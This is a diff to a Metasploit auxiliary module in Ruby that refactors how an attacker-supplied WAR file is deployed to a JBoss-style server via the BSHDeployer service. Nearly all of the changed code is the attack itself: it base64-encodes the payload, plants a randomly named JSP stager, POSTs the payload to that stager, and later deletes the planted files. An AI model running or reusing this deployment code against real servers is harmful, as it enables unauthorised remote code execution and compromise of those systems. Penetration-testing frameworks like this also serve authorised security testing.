@@ -40,7 +40,6 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('APPBASE',    [ true,  'Application base name']),
         OptString.new('STAGERNAME', [ false, 'Only used if VERB is not POST (default: "stager")', 'stager']),
         OptString.new('WARFILE',    [ true,  'The WAR file to deploy']),
-        OptString.new('PACKAGE',    [ true,  'The package containing the BSHDeployer service', 'auto' ]),
         OptBool.new('DEPLOY',       [ true,  'Deploy: true. Undeploy: false', true]),
       ], self.class)
   end
@@ -52,43 +51,62 @@ class Metasploit3 < Msf::Auxiliary
 
     uri = '/' + app_base + '/'
     if datastore['DEPLOY']
-      # Read the WAR from the file given
+      # Read the WAR from the given file
       war_data = File.read(datastore['WARFILE'])  
-
       encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
-
-      if datastore['VERB'] == 'POST' then
-        bsh_payload = gen_payload_bsh(encoded_payload, app_base)
-        if !deploy_bsh(bsh_payload)
-          fail_with(Failure::Unknown, "Failed to deploy the WAR payload")
-        end
+      if http_verb == 'POST' then
+        print_status("Deploying payload...")
+        opts = {
+          :file => "#{app_base}.war",
+          :contents => encoded_payload
+        }
       else
-        content_var = Rex::Text.rand_text_alpha(8+rand(8))
-        # We need to deploy a stager first
-        bsh_payload = gen_stager_bsh(app_base, stager_base, stager_jsp_name, content_var)
-        if !deploy_bsh(bsh_payload)
-          fail_with(Failure::Unknown, "Failed to deploy the WAR payload")
-        end
+        print_status("Deploying stager...")
+        stager_base     = rand_text_alpha(8+rand(8))
+        stager_jsp_name = rand_text_alpha(8+rand(8))
+        stager_contents = stager_jsp(app_base)
+        opts = {
+          :dir => "#{stager_base}.war",
+          :file => "#{stager_base}.war/#{stager_jsp_name}.jsp",
+          :contents => Rex::Text.encode_base64(stager_contents).gsub(/\n/, '')
+        }
+      end
+      bsh_payload = generate_bsh(:create, opts)
+      package = deploy_bsh(bsh_payload)
 
-        # now we call the stager to deploy our real payload war
-        stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
-        payload_data = "#{content_var}=#{Rex::Text.uri_encode(encoded_payload)}"
-        print_status("Calling stager to deploy final payload")
-        call_uri_mtimes(stager_uri, 5, 'POST', payload_data)
+      if package.nil?
+        fail_with(Failure::Unknown, "Failed to deploy")
       end
 
-      tmp_verb = datastore['VERB']
-      tmp_verb = 'GET' if tmp_verb == 'POST'
-      call_uri_mtimes(uri, 5, tmp_verb)
+      unless http_verb == 'POST'
+        # now we call the stager to deploy our real payload war
+        stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
+        payload_data = "#{rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
+        print_status("Calling stager #{stager_uri } to deploy final payload")
+        res = deploy('method' => 'POST',
+                     'data'   => payload_data,
+                     'uri'    => stager_uri)
+        unless res && res.code == 200
+          fail_with(Failure::Unknown, "Failed to deploy")
+        end
+    end
+
     else
       # Undeploy the WAR and the stager if needed
       print_status("Undeploying #{uri} by deleting the WAR file via BSHDeployer...")
-      if datastore['VERB'] == 'POST'
-        delete_script = gen_undeploy_bsh(app_base)
-      else
-        delete_script = gen_undeploy_stager(app_base, stager_base, stager_jsp_name)
+
+      files = {}
+      unless http_verb == 'POST'
+        files[:stager_jsp_name] = "#{stager_base}.war/#{stager_jsp_name}.jsp"
+        files[:stager_base] = "#{stager_base}.war"
       end
-      deploy_bsh(delete_script) 
+      files[:app_base] = "#{app_base}.war"
+      delete_script = generate_bsh(:delete, files)
+
+      package = deploy_bsh(delete_script) 
+      if package.nil?
+        print_warning("WARNING: Unable to remove WAR")
+      end
     end
   end
 end
